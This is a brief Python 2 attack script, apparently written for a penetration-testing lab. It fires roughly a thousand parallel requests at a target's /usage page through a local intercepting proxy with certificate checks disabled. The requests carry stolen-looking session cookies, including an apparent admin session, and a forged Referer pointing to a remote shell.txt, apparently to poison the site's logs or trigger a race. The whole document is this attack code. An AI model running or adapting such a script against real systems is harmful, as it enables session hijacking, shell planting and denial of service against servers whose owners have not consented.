import requests
import multiprocessing
from multiprocessing import Process

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxy = {"https":"http://127.0.0.1:8080"}

headers={'Host':'ip address',
'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
'Referer':'http://ip/shell.txt',
'Cookie':'session_id_issue_tracker=49b9ce1b-a96f-452a-8865-f06804675d17;session_id_admin=10.11.0.61-e71bfabb-5caa-4c05-8817-b3f17309e11'}

def send_req(headers,proxy):
	r=requests.get('https://10.11.1.22/usage',headers=headers,proxies=proxy,verify=False)
	print r.status_code

for i in range(1,1000):
	jobs=[]
	p=multiprocessing.Process(target=send_req,args=(headers,proxy))
	jobs.append(p)
	p.start()




### 0x10w1eve1 ###
